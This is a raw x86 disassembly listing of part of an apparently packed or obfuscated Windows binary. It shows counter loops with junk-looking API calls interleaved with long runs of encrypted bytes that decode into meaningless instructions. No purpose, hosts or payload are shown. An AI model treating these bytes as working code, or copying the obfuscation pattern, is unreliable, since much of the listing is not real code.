  40512b:	cmp    DWORD PTR ds:0x4336ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4336ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4336eb,0x43366f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4336e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	aad    0x2b
  405186:	js     0x40514b
  405188:	hlt    
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051e4
  405191:	dec    esi
  405192:	push   ds
  405193:	test   eax,0xe1b8dcb1
  405198:	arpl   dx,bp
  40519a:	rcl    DWORD PTR [edi],0xaa
  40519d:	or     al,BYTE PTR [edi+0x712020c4]
  4051a3:	or     ebx,edx
  4051a5:	add    eax,0xc7f8df67
  4051aa:	and    bl,BYTE PTR [ebx]
  4051ac:	popf   
  4051ad:	icebp  
  4051ae:	dec    ecx
  4051af:	leave  
  4051b0:	out    dx,eax
  4051b1:	xor    DWORD PTR [ecx],ebx
  4051b3:	stos   DWORD PTR es:[edi],eax
  4051b4:	sbb    DWORD PTR [ebx-0x507ff2d4],eax
  4051ba:	ffree  st(1)
  4051bc:	into   
  4051bd:	lds    esi,FWORD PTR [eax+0x783e0075]
  4051c3:	sbb    BYTE PTR [edi+0x67],0xc0
  4051c7:	cmc    
  4051c8:	cmp    DWORD PTR [eax],esi
  4051ca:	mov    eax,DWORD PTR [edx-0x18ddd147]
  4051d0:	sbb    ecx,DWORD PTR [eax]
  4051d2:	push   ss
  4051d3:	adc    BYTE PTR [ebx],ch
  4051d5:	cmp    al,0x92
  4051d7:	ins    BYTE PTR es:[edi],dx
  4051d8:	es ins DWORD PTR es:[edi],dx
  4051da:	int3   
  4051db:	mov    eax,ds:0xb2fbbd24
  4051e0:	ror    BYTE PTR ds:0xc731e4e9,0x84
  4051e7:	xchg   edi,eax
  4051e8:	das    
  4051e9:	sub    dh,bh
  4051eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ec:	pusha  
  4051ed:	mov    eax,ds:0xe200f7d7
  4051f2:	test   al,0x47
  4051f4:	mov    ah,0x23
  4051f6:	adc    dl,BYTE PTR [edx+eax*2-0x36]
  4051fa:	cli    
  4051fb:	bound  ebp,QWORD PTR [eax-0x47]
  4051fe:	cmp    ch,BYTE PTR [esp+ebp*4-0x2e3b2966]
  405205:	hlt    
  405206:	and    ebx,DWORD PTR [edi+0x41]
  405209:	jp     0x405217
  40520b:	stos   DWORD PTR es:[edi],eax
  40520c:	and    BYTE PTR [ebx],bh
  40520e:	xor    esi,DWORD PTR [ebx]
  405210:	jecxz  0x405213
  405212:	push   ds
  405213:	div    BYTE PTR [edx+eiz*2]
  405216:	ret    0xed0
  405219:	pop    edi
  40521a:	cli    
  40521b:	cmp    edx,DWORD PTR [ebp*1+0x5a0a0f9d]
  405222:	push   ebx
  405223:	add    BYTE PTR [edx-0x45],0xf0
  405227:	pop    ebx
  405228:	cdq    
  405229:	sti    
  40522a:	push   ecx
  40522b:	scas   al,BYTE PTR es:[edi]
  40522c:	test   al,0xdb
  40522e:	icebp  
  40522f:	jns    0x4051ff
  405231:	sar    DWORD PTR [ebp-0x34],1
  405234:	mov    ebx,0xad30eb6c
  405239:	add    eax,0xcaa407d6
  40523e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40523f:	fwait
  405240:	cld    
  405241:	push   cs
  405242:	cmp    eax,0x8d07b0c9
  405247:	pop    es
  405248:	inc    esp
  405249:	imul   DWORD PTR [edx+0x34]
  40524c:	das    
  40524d:	(bad)  
  40524e:	ffree  st(2)
  405250:	add    cl,0xd2
  405253:	into   
  405254:	add    DWORD PTR [ecx-0x40e31f93],ebx
  40525a:	jg     0x40523b
  40525c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40525d:	(bad)  
  40525f:	push   ecx
  405260:	and    DWORD PTR [edi+0x63b3eb98],0x91eb0986
  40526a:	push   esp
  40526b:	inc    ebp
  40526c:	fadd   QWORD PTR [ecx+0x57]
  40526f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405270:	pop    ebp
  405271:	xchg   ebx,eax
  405272:	jbe    0x40524d
  405274:	adc    eax,0x9015eef4
  405279:	mov    esi,0x9ac98690
  40527e:	ret    0x8068
  405281:	xchg   esi,eax
  405282:	shl    BYTE PTR [ecx+eax*8],cl
  405285:	mov    ds:0x18f82794,eax
  40528a:	xchg   edi,eax
  40528b:	jp     0x405218
  40528d:	test   al,0xcb
  40528f:	aad    0x4a
  405291:	cmp    eax,0xc90c7850
  405296:	daa    
  405297:	and    DWORD PTR [edi],ebp
  405299:	cmp    cl,BYTE PTR [esi+0x525b3e1f]
  40529f:	inc    edx
  4052a0:	test   BYTE PTR [ecx-0x2633fce6],0xf9
  4052a7:	in     al,0x8a
  4052a9:	lock or al,0xcd
  4052ac:	mov    edx,0xbe15c283
  4052b1:	pop    ds
  4052b2:	int    0xbb
  4052b4:	jecxz  0x4052e1
  4052b6:	inc    esp
  4052b7:	mov    BYTE PTR [eax-0x68],0x90
  4052bb:	arpl   WORD PTR [esi+edx*2+0x5e4823b0],dx
  4052c2:	mov    edx,DWORD PTR [edx-0x5]
  4052c5:	or     DWORD PTR [eax-0x52d43d8d],esi
  4052cb:	(bad)  
  4052cc:	fld    TBYTE PTR [edx+ebx*4-0x427300fe]
  4052d3:	xchg   ecx,eax
  4052d4:	push   esp
  4052d5:	test   esp,edx
  4052d7:	enter  0x94de,0x7e
  4052db:	push   0xd05cc2c2
  4052e0:	cli    
  4052e1:	mov    ebx,0x6c9f9e43
  4052e6:	push   esi
  4052e7:	int    0x56
  4052e9:	mov    dl,0x2
  4052eb:	jns    0x405362
  4052ed:	aad    0x6c
  4052ef:	push   edi
  4052f0:	rcl    BYTE PTR [ecx],0xdb
  4052f3:	(bad)  
  4052f4:	lock mov BYTE PTR [ebx-0x9eee34a],ch
  4052fb:	pop    ebx
  4052fc:	mov    dh,0x8
  4052ff:	mov    ah,0x17
  405301:	pop    eax
  405302:	mov    WORD PTR [edx+ebp*8],?
  405305:	jns    0x4052c2
  405307:	loope  0x40533e
  405309:	aad    0xfb
  40530b:	dec    esi
  40530c:	mov    dl,BYTE PTR [ecx-0xad3712c]
  405312:	adc    eax,0x54b928a
  405317:	sub    eax,0x3bb8e06f
  40531c:	repnz dec ebx
  40531e:	dec    edx
  40531f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405320:	mov    ?,ecx
  405322:	xchg   ebx,eax
  405323:	loop   0x405387
  405325:	or     DWORD PTR [ecx],edi
  405327:	and    eax,0xdc89db0a
  40532c:	inc    ebp
  40532d:	outs   dx,DWORD PTR ds:[esi]
  40532e:	xchg   esi,eax
  40532f:	not    DWORD PTR [edx-0x467f25cf]
  405335:	xor    eax,0xf3d2b6d9
  40533a:	(bad)  
  40533b:	pop    esp
  40533c:	test   BYTE PTR [ecx+0x2f7faf2e],bl
  405342:	xchg   esp,eax
  405343:	pushf  
  405344:	ret    0x4791
  405347:	sbb    BYTE PTR gs:[ebx-0x516f1376],ch
  40534e:	rcr    BYTE PTR [ecx-0x66],0x71
  405352:	les    ebp,FWORD PTR [ebp+0x6bd84ce7]
  405358:	lahf   
  405359:	jmp    0x4bc9225b
  40535e:	and    eax,0x6e9c4d15
  405363:	sub    dl,BYTE PTR [esi-0x4c]
  405366:	fwait
  405367:	pop    edi
  405368:	mov    ch,0xfc
  40536a:	mov    edi,0x6053309d
  40536f:	or     ebx,ebx
  405371:	popa   
  405372:	mov    DWORD PTR [ecx-0x46],esp
  405375:	xlat   BYTE PTR ds:[ebx]
  405376:	mov    ah,0x4c
  405378:	xchg   ebx,eax
  405379:	aad    0xdb
  40537b:	aaa    
  40537c:	fidiv  DWORD PTR [esi+0x54db646b]
  405382:	test   DWORD PTR [eax-0x26],edx
  405385:	repz sub edx,esi
  405388:	test   DWORD PTR [edi-0x77207a89],ecx
  40538e:	dec    ebp
  40538f:	sti    
  405390:	and    al,0xb9
  405392:	sbb    eax,0x715f854d
  405397:	in     eax,dx
  405398:	ss fs int3 
  40539b:	ds pop esi
  40539d:	jp     0x29d57f03
  4053a3:	inc    ebx
  4053a4:	pop    ebx
  4053a5:	adc    DWORD PTR [ebx+0xf9ef756],ebp
  4053ab:	test   eax,0x76ed44b9
  4053b0:	inc    eax
  4053b1:	sbb    ah,bh
  4053b3:	mov    edi,0xf8892605
  4053b8:	xor    BYTE PTR [ecx],bl
  4053ba:	popf   
  4053bb:	pushf  
  4053bc:	inc    edi
  4053bd:	jp     0x40541f
  4053bf:	sub    BYTE PTR [esi],bl
  4053c1:	cmp    DWORD PTR [eax-0x67],ebx
  4053c4:	fincstp 
  4053c6:	push   esp
  4053c7:	lea    edx,[eax-0x76]
  4053ca:	mov    edi,0x95a5d263
  4053cf:	adc    BYTE PTR [ecx-0x75],0x8a
  4053d3:	cli    
  4053d4:	loopne 0x405429
  4053d6:	xchg   BYTE PTR [ebp-0x6c],cl
  4053d9:	maskmovq mm4,(bad)
  4053da:	mul    DWORD PTR [eax+0x47]
  4053dd:	mov    ah,0x6c
  4053df:	aas    
  4053e0:	push   ss
  4053e1:	jmp    0xafd3:0x4053baec
  4053e8:	test   DWORD PTR [ecx-0x1],ebx
  4053eb:	inc    edx
  4053ec:	mov    eax,ds:0x76e06ca4
  4053f1:	mul    cl
  4053f3:	jnp    0x4053fb
  4053f5:	inc    eax
  4053f6:	jne    0x4053d9
  4053f8:	sbb    ch,BYTE PTR [edx-0x57]
  4053fb:	xchg   edx,eax
  4053fc:	cmp    cl,bl
  4053fe:	call   0xab53:0x4c08e0a3
  405405:	pop    edi
  405406:	iret   
  405407:	rcl    esi,cl
  405409:	xchg   esi,eax
  40540a:	adc    BYTE PTR [edi-0x27bb922f],dl
  405410:	jo     0x40546d
  405412:	xchg   edx,eax
  405413:	dec    edx
  405414:	sbb    BYTE PTR [edi-0x257e112d],ch
  40541a:	shl    DWORD PTR [eax],1
  40541c:	xchg   ebp,eax
  40541d:	div    DWORD PTR [ecx+0x3c2af3e1]
  405423:	pop    edi
  405424:	mov    dl,0xa5
  405426:	ins    DWORD PTR es:[edi],dx
  405427:	ja     0x405405
  405429:	dec    esp
  40542a:	pop    ss
  40542b:	jo     0x40547a
  40542d:	js     0x4053d2
  40542f:	jmp    0x1e55:0x9e7d40a8
  405436:	dec    esi
  405437:	in     al,dx
  405438:	sahf   
  405439:	mov    bh,0x93
  40543b:	dec    edi
  40543c:	sar    BYTE PTR [ecx+eax*4+0x20],1
  405440:	les    edx,FWORD PTR [ebx]
  405442:	std    
  405443:	sti    
  405444:	ja     0x40542a
  405446:	fild   QWORD PTR [edx]
  405448:	xor    al,0xf5
  40544a:	inc    esi
  40544b:	add    al,0x55
  40544d:	cs push ebx
  40544f:	mov    ch,0x7d
  405451:	cmp    eax,esi
  405453:	and    eax,esp
  405455:	in     al,0x63
  405457:	rcr    BYTE PTR [edx+eax*8],0x8a
  40545b:	loopne 0x40540f
  40545d:	les    ebp,FWORD PTR [ebp+0x4cd13dd7]
  405463:	ret    0x4002
  405466:	inc    esp
  405467:	mov    edi,0x203e3543
  40546c:	lds    ecx,FWORD PTR [edx+ebx*1+0x4f812574]
  405473:	arpl   WORD PTR [ebx],di
  405475:	jne    0x40547f
  405477:	aam    0xde
  405479:	pop    esp
  40547a:	pop    ds
  40547b:	pop    es
  40547c:	adc    BYTE PTR [esi+0x30],bh
  40547f:	sbb    BYTE PTR [ecx-0x7],dh
  405482:	bound  ecx,QWORD PTR [ebp+0x5e70f049]
  405488:	jp     0x405509
  40548a:	and    DWORD PTR ds:0x95783b9,ebx
  405490:	inc    ebx
  405491:	xchg   ebx,eax
  405492:	sti    
  405493:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405494:	lds    esp,FWORD PTR [ecx]
  405496:	mov    esp,0x9969b804
  40549b:	mov    ds:0xfb646d42,al
  4054a0:	inc    edx
  4054a1:	mov    ebx,0xa792208d
  4054a6:	out    dx,eax
  4054a7:	shl    DWORD PTR [ecx-0x5e],1
  4054aa:	or     eax,0x37aed476
  4054b0:	inc    esi
  4054b1:	cmp    al,0xf9
  4054b3:	(bad)  
  4054b4:	inc    ebx
  4054b5:	ds jmp 0xd0f63f50
  4054bb:	jmp    0x4054d8
  4054bd:	ins    BYTE PTR es:[edi],dx
  4054be:	jmp    0x40546d
  4054c0:	fsubr  QWORD PTR [ebx]
  4054c2:	cmp    edx,DWORD PTR [edx+0x5c463430]
  4054c8:	xchg   esi,eax
  4054c9:	popf   
  4054ca:	jbe    0x405455
  4054cc:	mov    ebx,0x16e9d103
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4336e7
  4054e3:	or     DWORD PTR ds:0x433703,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4336f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4336f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4336f3,ebx
  405504:	cmp    DWORD PTR ds:0x4336f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4336f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4336f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4336f3,ebx
  405545:	cmp    DWORD PTR ds:0x4336f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4336f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4336b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4336b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4336b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4336b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433846
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4336b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xf9ea6f78
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x4055fd
  40563a:	test   BYTE PTR [edx+ebp*2],al
  40563d:	pop    eax
  40563e:	add    eax,0x268bd390
  405643:	rcl    DWORD PTR [edx-0x7d755088],cl
  405649:	test   al,0x28
  40564b:	xor    BYTE PTR [ecx+0x2b51403e],dh
  405651:	jo     0x40567e
  405653:	es ja  0x4055fd
  405656:	ins    DWORD PTR es:[edi],dx
  405657:	pop    edi
  405658:	std    
  405659:	mov    esp,0x6f73dc90
  40565e:	repz test BYTE PTR [edx-0x65],ch
  405662:	cmc    
  405663:	jo     0x4055f2
  405665:	dec    ebp
  405666:	sub    eax,0x2d793c21
  40566b:	data16 hlt 
  40566d:	cmp    cl,cl
  40566f:	jns    0x4056de
  405671:	into   
  405672:	and    DWORD PTR [ebx+0x53c8de15],eax
  405678:	mov    eax,ds:0x444c7731
  40567d:	jg     0x4056d2
  40567f:	aam    0x88
  405681:	pop    ds
  405682:	jno    0x405699
  405684:	sub    DWORD PTR [ebx],ebx
  405686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405687:	scas   eax,DWORD PTR es:[edi]
  405688:	fistp  DWORD PTR ds:0xbaa7376f
  40568e:	cmp    al,0xfd
  405690:	mov    cl,0xeb
  405692:	dec    ebp
  405693:	jae    0x405706
  405695:	ja     0x40565c
  405697:	xchg   ecx,eax
  405698:	out    dx,eax
  405699:	cmp    BYTE PTR [ebx-0x7b88ebdf],0xab
  4056a0:	pop    esp
  4056a1:	adc    dh,BYTE PTR [edx-0x7c3f34c5]
  4056a7:	push   esp
  4056a8:	mov    cl,0xda
  4056aa:	sar    ah,1
  4056ac:	in     eax,0x78
  4056ae:	imul   esi,DWORD PTR [ebp+esi*4+0x7],0xd85a6eb2
  4056b6:	push   ecx
  4056b7:	jmp    0x40566b
  4056b9:	outs   dx,DWORD PTR ds:[esi]
  4056ba:	call   0x94b:0xc9fc9e85
  4056c1:	sub    al,0x4b
  4056c3:	enter  0xbe7e,0xa
  4056c7:	add    eax,edx
  4056c9:	and    ah,BYTE PTR [edi]
  4056cb:	cmp    DWORD PTR [esi-0x7a58c0a9],ebx
  4056d1:	int3   
  4056d2:	stos   BYTE PTR es:[edi],al
  4056d3:	es inc ebx
  4056d5:	pop    eax
  4056d6:	mov    edi,0xef7d0cde
  4056db:	sbb    BYTE PTR [ebx-0x3e],al
  4056de:	leave  
  4056df:	pop    edi
  4056e0:	(bad)  
  4056e1:	ds mov ah,0x4c
  4056e4:	inc    ebp
  4056e5:	jecxz  0x40570e
  4056e7:	loope  0x40573d
  4056e9:	outs   dx,BYTE PTR ds:[esi]
  4056ea:	push   ebx
  4056eb:	adc    DWORD PTR [edx],eax
  4056ed:	mov    bl,0x16
  4056ef:	xchg   esi,eax
  4056f0:	(bad)  
  4056f1:	std    
  4056f2:	jb     0x405762
  4056f4:	fcmovnbe st,st(5)
  4056f6:	scas   eax,DWORD PTR es:[edi]
  4056f7:	and    bl,BYTE PTR [ebx]
  4056f9:	pop    esi
  4056fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056fb:	stos   DWORD PTR es:[edi],eax
  4056fc:	mov    ah,0x7a
  4056fe:	loopne 0x4056a8
  405700:	add    BYTE PTR [esi+0x704970c7],0xd3
  405707:	pop    edx
  405708:	jge    0x40576e
  40570a:	mov    al,ds:0x93e6b4cf
  40570f:	dec    esi
  405710:	add    eax,DWORD PTR [eax]
  405712:	in     eax,dx
  405713:	aam    0x32
  405715:	mov    cl,0xab
  405717:	pop    ebp
  405718:	shl    DWORD PTR [edi+0x412b9728],1
  40571e:	test   al,0xd0
  405720:	mov    edi,0xa6a721f7
  405725:	cmp    BYTE PTR [ecx+0x2d8da644],ch
  40572b:	(bad)  [edi]
  40572d:	loopne 0x40578b
  40572f:	mov    cl,0xb8
  405731:	imul   ebx,DWORD PTR [ebp-0x3a37f2f6],0x5d044197
  40573b:	aad    0x41
  40573d:	mov    ds:0xc578cbdd,al
  405742:	mov    ebx,0x642bdecb
  405747:	mov    edi,0x84442f8d
  40574c:	pop    ebx
  40574d:	outs   dx,DWORD PTR ds:[esi]
  40574e:	jnp    0x4056fa
  405750:	retf   0xb029
  405753:	js     0x4057b8
  405755:	mov    ecx,0xb48a698
  40575a:	xchg   esi,eax
  40575b:	sub    al,0x61
  40575d:	jo     0x4056fe
  40575f:	shl    DWORD PTR [ebx-0x5fa1ea2],0xb9
  405766:	xlat   BYTE PTR ds:[ebx]
  405767:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405768:	pop    ds
  405769:	and    ah,dh
  40576b:	mov    ebx,DWORD PTR [ebp+0x6c5377e6]
  405771:	outs   dx,DWORD PTR ds:[esi]
  405772:	xor    eax,0xccdcd798
  405777:	xchg   esp,eax
  405778:	xor    bl,BYTE PTR [ecx]
  40577a:	mov    bh,0x75
  40577c:	and    DWORD PTR [edi+0xef2c593],0xffffffac
  405783:	sti    
  405784:	mov    al,ds:0x910904fa
  405789:	dec    esp
  40578a:	jns    0x405759
  40578c:	int    0xf
  40578e:	ror    BYTE PTR [ecx+edx*8-0x3c80df76],cl
  405795:	mov    ?,eax
  405797:	push   ds
  405798:	add    eax,0x30a88bec
  40579d:	js     0x4057a4
  40579f:	mov    edi,0xe371567e
  4057a4:	cmp    DWORD PTR [ecx],ebp
  4057a6:	mov    ds,WORD PTR [ecx+0x57]
  4057a9:	add    ch,BYTE PTR [edx+0x53a68302]
  4057af:	add    eax,0x9b337a33
  4057b4:	call   0xc225:0xf519d0e6
  4057bb:	xor    esi,DWORD PTR [esi+0x2c]
  4057be:	mov    ebp,0xfc545fdc
  4057c3:	push   ss
  4057c4:	std    
  4057c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c6:	icebp  
  4057c7:	and    esp,DWORD PTR [edx-0x75d4164d]
  4057cd:	imul   ebp,DWORD PTR [edx],0x1649f9aa
  4057d3:	push   edx
  4057d4:	mov    ch,0xdb
  4057d7:	sbb    DWORD PTR [esp],ebp
  4057da:	add    edx,esp
  4057dc:	xchg   esp,ebx
  4057de:	fild   QWORD PTR [esi+0x6c]
  4057e1:	inc    ecx
  4057e2:	(bad)  
  4057e3:	loope  0x40579d
  4057e5:	icebp  
  4057e6:	jmp    0x6472:0x8dbfa155
  4057ed:	push   0x84b1fa42
  4057f2:	sbb    al,0xae
  4057f4:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057f6:	or     DWORD PTR [eax],edi
  4057f8:	xor    al,0x3b
  4057fa:	sbb    DWORD PTR [eax+0x7dd5e38],edx
  405800:	fstp   DWORD PTR [ebx+0x7f3b9439]
  405806:	lahf   
  405807:	icebp  
  405808:	push   esp
  405809:	pop    edi
  40580a:	inc    esp
  40580b:	nop
  40580c:	dec    ebx
  40580d:	jmp    0x4057c7
  40580f:	test   DWORD PTR [edi],0x5efe06b3
  405815:	sbb    al,0x71
  405817:	xor    al,0x3f
  405819:	test   al,0x2c
  40581b:	test   DWORD PTR ds:0x223a7eba,ecx
  405821:	inc    ebx
  405822:	mov    edi,0x756f2543
  405827:	pop    ds
  405828:	dec    edx
  405829:	push   cs
  40582a:	(bad)  
  40582b:	clc    
  40582c:	les    ebx,FWORD PTR [esi-0x78]
  40582f:	out    dx,eax
  405830:	inc    esi
  405831:	nop
  405832:	test   eax,0x6771ee9c
  405837:	mov    eax,ds:0x44c3f68c
  40583c:	ss pop ebp
  40583e:	add    DWORD PTR [edx],ecx
  405840:	jbe    0x4057fc
  405842:	std    
  405843:	cdq    
  405844:	dec    ebp
  405845:	outs   dx,BYTE PTR ds:[esi]
  405846:	nop
  405847:	sub    BYTE PTR [eax-0x5a],0x2c
  40584b:	jmp    0x7fd58dfe
  405850:	fist   DWORD PTR [esi+eax*4+0x20ec769c]
  405857:	pop    esi
  405858:	mov    eax,0x3abc7554
  40585d:	ret    0x4c6b
  405860:	pop    eax
  405861:	jecxz  0x405840
  405863:	xchg   ch,al
  405865:	mov    esp,0x91582606
  40586a:	test   al,0xde
  40586c:	out    dx,eax
  40586d:	xlat   BYTE PTR ds:[ebx]
  40586e:	adc    eax,0x8312c000
  405873:	mov    bh,0xe6
  405875:	stos   BYTE PTR es:[edi],al
  405876:	int3   
  405877:	cmc    
  405878:	jmp    0x7d8ef4c2
  40587d:	shr    DWORD PTR [edx],cl
  40587f:	push   esi
  405880:	daa    
  405881:	push   0xdd163361
  405886:	call   0xe097:0xe8bb14ae
  40588d:	add    BYTE PTR [ebx+0x7c],ch
  405890:	add    al,BYTE PTR [ebx-0x215ea7f]
  405896:	and    ah,BYTE PTR [ebp-0x31bf7699]
  40589c:	je     0x40588a
  40589e:	mov    al,ds:0xd1257e0a
  4058a3:	sahf   
  4058a4:	mov    BYTE PTR [ebx],ah
  4058a6:	jmp    0x2adf0f0a
  4058ab:	mov    ch,BYTE PTR [edx+eax*2-0x2]
  4058af:	push   0x2a
  4058b1:	inc    esp
  4058b2:	ret    0x7fe4
  4058b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b6:	ja     0x405918
  4058b8:	loope  0x40588e
  4058ba:	xchg   esi,eax
  4058bb:	popf   
  4058bc:	dec    ecx
  4058bd:	fwait
  4058be:	inc    ecx
  4058bf:	sbb    eax,0x924c3b0d
  4058c4:	inc    eax
  4058c5:	adc    eax,0xde06102c
  4058ca:	sbb    esi,DWORD PTR [esi+0x4b]
  4058cd:	pop    esi
  4058ce:	jp     0x4058c1
  4058d0:	adc    dh,ch
  4058d2:	mov    al,0xcc
  4058d4:	push   ebp
  4058d5:	retf   
  4058d6:	arpl   WORD PTR [esi+0x52],di
  4058d9:	mul    BYTE PTR [bx+di]
  4058dc:	xchg   DWORD PTR [edx+0x2b43084a],ebx
  4058e2:	mul    dh
  4058e4:	or     BYTE PTR [edi],0xb4
  4058e7:	pop    ss
  4058e8:	jnp    0x405947
  4058ea:	into   
  4058eb:	aad    0x8b
  4058ed:	sub    BYTE PTR [ecx+ebp*4+0x74975eb],dh
  4058f4:	repz cmp eax,0xe67711e5
  4058fa:	fcmovnu st,st(1)
  4058fc:	enter  0x25cf,0xd5
  405900:	xchg   ebx,eax
  405901:	sbb    al,BYTE PTR [edx+edx*8+0x6c]
  405905:	or     al,BYTE PTR [eax-0x30]
  405908:	nop
  405909:	push   ss
  40590a:	lds    edi,FWORD PTR [edx]
  40590c:	(bad)  
  40590d:	std    
  40590e:	jno    0x4058f1
  405910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405911:	faddp  st(3),st
  405913:	icebp  
  405914:	sbb    ebx,DWORD PTR [esi+0x41]
  405917:	dec    esp
  405918:	xchg   edi,eax
  405919:	ja     0x405932
  40591b:	scas   al,BYTE PTR es:[edi]
  40591c:	mov    ah,0x6
  40591e:	sbb    DWORD PTR [edi],ecx
  405920:	xor    bl,bl
  405922:	mov    ecx,0x42dc0e6
  405927:	pop    edx
  405928:	xchg   ecx,eax
  405929:	fadd   QWORD PTR [ebp+ebx*2+0x1]
  40592d:	js     0x40591d
  40592f:	mov    ?,esp
  405931:	retf   0x7f64
  405934:	(bad)  
  405935:	cdq    
  405936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405937:	test   BYTE PTR [ebx],ah
  405939:	out    dx,eax
  40593a:	push   ds
  40593b:	xlat   BYTE PTR ds:[ebx]
  40593c:	dec    ebp
  40593d:	(bad)  
  40593e:	rcr    BYTE PTR [ecx],1
  405940:	dec    ebx
  405941:	add    al,0x30
  405944:	xchg   esp,eax
  405945:	and    al,0x19
  405947:	cs in  al,dx
  405949:	dec    esp
  40594a:	cld    
  40594b:	pop    ds
  40594c:	sbb    ebx,DWORD PTR [ecx-0x150f2bcf]
  405952:	lds    ebx,FWORD PTR [esi+edi*1]
  405955:	pop    ds
  405956:	icebp  
  405957:	mov    dh,0xa3
  405959:	sbb    ecx,DWORD PTR [eax+eax*8+0x192ff2bd]
  405960:	and    dh,BYTE PTR [ebx-0x4]
  405963:	bound  edx,QWORD PTR [ebp-0x4581f1e5]
  405969:	outs   dx,BYTE PTR ds:[esi]
  40596a:	xor    bl,dl
  40596c:	sbb    eax,0x12df6685
  405971:	int3   
  405972:	rcl    BYTE PTR [ecx+0x8],1
  405975:	cmp    eax,0xe9d0558b
  40597a:	pop    esi
  40597b:	or     al,BYTE PTR [eax]
  40597d:	add    BYTE PTR [ebx+0x7d8bc855],cl
  405983:	cld    
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
